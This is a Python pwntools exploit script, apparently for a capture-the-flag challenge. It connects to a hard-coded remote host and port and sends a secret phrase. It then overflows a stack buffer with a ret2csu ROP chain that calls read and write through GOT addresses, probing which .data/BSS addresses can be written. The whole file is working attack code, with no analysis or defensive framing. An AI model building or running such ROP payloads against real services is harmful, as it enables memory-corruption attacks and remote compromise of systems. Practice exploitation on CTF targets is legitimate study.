#!/usr/bin/env python3
from pwn import *
context.arch='amd64'
context.log_level='error'

HOST='154.57.164.77'; PORT=32702
csu_pop=0x401512; csu_call=0x4014f8
got_read=0x403250; got_write=0x403230; got_open=0x403278

# Use addresses within the definitely-mapped regions
# .data: 0x404000 (16 bytes) - but has stdout pointers nearby
# Stack buffer is at rbp-0x40 -> we have stack leak from buf_leak

# Use addresses past the .data/.bss but within the page
# BSS: 0x404010-0x404030 (32 bytes)
# Page extends to 0x405000 (2 pages from 0x403000)

# Let's use 0x404030 and 0x404060 - should be within page
bp=0x404000  # start of .data, first 16 bytes are safe-ish
bm=0x404030  # just past BSS, but within same page

# Actually let me try with addresses VERY near BSS first
# 0x404028 is 8 bytes into BSS, past stdin ptr (0x404020)
# But we don't want to overwrite stdin if we write a lot

# Safest bet: use the buf stack area itself
# After leave;ret, the stack is at buf_leak + 0x40 + 8 + 8 = buf_leak + 0x50
# I can store data in the BSS area past stdout/stdin at 0x404028

# Let me just use addresses at the END of BSS:
bp_test=0x404030  # should still be on mapped page (0x403000-0x404fff)

def test_addr(addr, name):
    """Write a pattern to BSS using CSU read, then echo it back"""
    r=remote(HOST,PORT)
    r.sendlineafter(b'secret phrase:',b's34s0nf1n4l3b00')
    r.recvuntil(b'wish for next year:')
    
    pay=b'A'*72
    # read(0, addr, 16) 
    pay+=p64(csu_pop)+p64(0)+p64(1)+p64(0)+p64(addr)+p64(16)+p64(got_read)
    pay+=p64(csu_call)+p64(0)+p64(0)*6
    # write(1, addr, 16)
    pay+=p64(csu_pop)+p64(0)+p64(1)+p64(1)+p64(addr)+p64(16)+p64(got_write)
    pay+=p64(csu_call)+p64(0)+p64(0)*6
    
    r.send(pay)
    import time; time.sleep(1)
    r.send(b'HELLO_AT_ADDR!!')
    time.sleep(1)
    try:
        data=r.recv(timeout=5)
        if b'HELLO' in data:
            print(f'Addr {hex(addr)} ({name}) WORKS!')
        else:
            print(f'Addr {hex(addr)} ({name}): got {data[:60]} (no HELLO)')
    except Exception as e:
        print(f'Addr {hex(addr)} ({name}): {e}')
    r.close()

# Test multiple BSS-adjacent addresses
test_addr(0x404000, '.data start')
test_addr(0x404010, 'BSS start (stdout)')
test_addr(0x404020, 'BSS (stdin)')
test_addr(0x404028, 'BSS end-8')
test_addr(0x404030, 'BSS end')
test_addr(0x404040, 'BSS+16')
test_addr(0x404080, 'BSS+0x50')
test_addr(0x404100, 'BSS+0xf0')
test_addr(0x404200, 'BSS+0x1f0')
